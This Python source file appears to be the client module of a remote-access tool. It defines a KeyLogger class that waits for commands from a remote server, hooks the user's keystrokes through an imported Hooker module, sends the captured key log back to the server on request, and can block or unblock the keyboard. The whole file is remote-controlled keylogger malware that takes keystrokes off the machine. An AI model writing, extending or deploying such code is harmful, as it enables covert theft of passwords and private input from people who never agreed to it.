from Hooker import Hooker
import threading


class KeyLogger:
    def __init__(self, server):
        self.server = server
        self.hooker = Hooker()

    def start_listening(self):
        dict = {
            "PRINT": self.print_keys,
            "HOOK": self.hook_keys,
            "UNHOOK": self.unhook_keys,
            "BLOCK": self.block_keys,
            "UNBLOCK": self.unblock_keys,
        }

        while True:
            s = self.server.receive_signal()

            if s in dict:
                dict[s]()
            elif s == "QUIT":
                break

    def hook_keys(self):
        threading.Thread(target=self.hooker.start, daemon=True).start()

        while self.hooker.is_hooked is None:
            pass

        if self.hooker.is_hooked:
            self.server.send_signal("Success")

        else:
            self.server.send_signal("Failed")

    def unhook_keys(self):
        self.hooker.stop()

    def print_keys(self):
        s = self.hooker.get_key_log()
        self.server.send_obj(s)

    def block_keys(self):
        ok = self.hooker.block()

        if ok:
            self.server.send_signal("Success")
        else:
            self.server.send_signal("Failed")

    def unblock_keys(self):
        self.hooker.unblock()

    def stop(self):
        try:
            self.hooker.get_key_log()
        finally:
            self.unhook_keys()
            self.unblock_keys()
